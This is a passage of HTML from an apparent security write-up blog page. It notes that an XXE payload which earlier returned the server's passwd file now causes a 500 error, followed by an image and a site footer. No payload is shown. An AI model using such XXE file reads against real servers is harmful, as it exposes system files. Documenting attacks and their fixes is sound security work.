+..SNIP..</span></span></span></code></pre><div id="https://www.notion.so/e8b4298e0c20444fb1b1e5c6be188021" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">When I upload the same XXE payload from earlier, the server now responds with a 500 error instead of sending back the passwd file.</span></span></p></div><div id="https://www.notion.so/ce1300e9d719480eb017139af5d46190" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F48e450a2-0610-47d7-8389-32263d3c56fe%2FUntitled.png?width=864&amp;table=block&amp;id=ce1300e9-d719-480e-b017-139af5d46190"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F48e450a2-0610-47d7-8389-32263d3c56fe%2FUntitled.png?width=864&amp;table=block&amp;id=ce1300e9-d719-480e-b017-139af5d46190" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/caef97fe94374566a436e570a34cb019" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/ffb0fe491e084ab38f1dd9027f7b5543" class="Divider"></div></article>
+  <footer class="Footer">
+  <div>&copy; C:\Users\ch3ng &gt;_ 2024</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
+
+</body>
+
+</html>
